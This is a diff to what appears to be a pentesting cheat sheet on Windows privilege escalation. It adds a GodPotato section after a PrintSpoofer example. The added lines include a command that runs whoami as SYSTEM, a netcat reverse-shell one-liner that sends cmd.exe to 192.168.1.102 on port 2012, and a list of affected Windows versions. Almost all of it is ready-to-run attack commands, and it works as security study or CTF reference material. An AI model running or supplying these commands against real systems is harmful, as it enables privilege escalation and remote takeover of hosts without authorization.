@@ -234,6 +234,15 @@ victim: .\PrintSpoofer64.exe -i -c powershell.exe(cmd.exe)\
 
 whoami
 ```
+###### Godpotato
+```
+GodPotato-NET4.exe
+GodPotato -cmd "cmd /c whoami"
+GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"
+
+Affected version:
+Windows Server 2012 - Windows Server 2022 Windows8 - Windows 11
+```
 ###### PowerUp.ps1
 ```
 Service Enumeration:
